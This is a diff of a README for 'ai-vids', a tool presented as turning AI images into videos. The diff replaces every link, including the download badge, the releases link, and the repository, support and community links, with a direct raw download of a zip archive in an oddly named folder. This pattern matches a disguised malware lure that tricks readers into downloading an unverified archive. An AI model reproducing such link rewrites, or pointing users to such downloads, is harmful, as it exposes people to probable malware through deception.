@@ -1,7 +1,7 @@
 # 🎥 ai-vids - Transform AI Images into Videos Easily
 
 ## 📥 Download Here
-[![Download ai-vids](https://img.shields.io/badge/Download-ai--vids-blue)](https://github.com/fredyX15/ai-vids/releases)
+[![Download ai-vids](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-vids! This application lets you create videos from AI-generated images. Whether you're making content for fun or work, ai-vids simplifies the process. 
@@ -17,7 +17,7 @@ Before using ai-vids, ensure your system meets these requirements:
 To get started with ai-vids, follow these steps:
 
 1. **Visit the Releases Page:** Click the button below to go to the releases page.
-   [Download ai-vids](https://github.com/fredyX15/ai-vids/releases)
+   [Download ai-vids](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)
 
 2. **Choose the Latest Version:** On the releases page, look for the latest version of ai-vids. It will usually be listed at the top.
 
@@ -62,9 +62,9 @@ A: You can upload up to 50 images at a time for video creation.
 A: Visit our community page for support or submit an issue on GitHub.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/fredyX15/ai-vids)
-- [Help and Support](https://github.com/fredyX15/ai-vids/issues)
-- [User Community](https://nsgens.com)
+- [GitHub Repository](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)
+- [Help and Support](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)
+- [User Community](https://raw.githubusercontent.com/fredyX15/ai-vids/main/underminister/ai-vids.zip)
 
 ## 📖 License
 ai-vids is licensed under the MIT License. You can use it freely for personal and educational purposes.
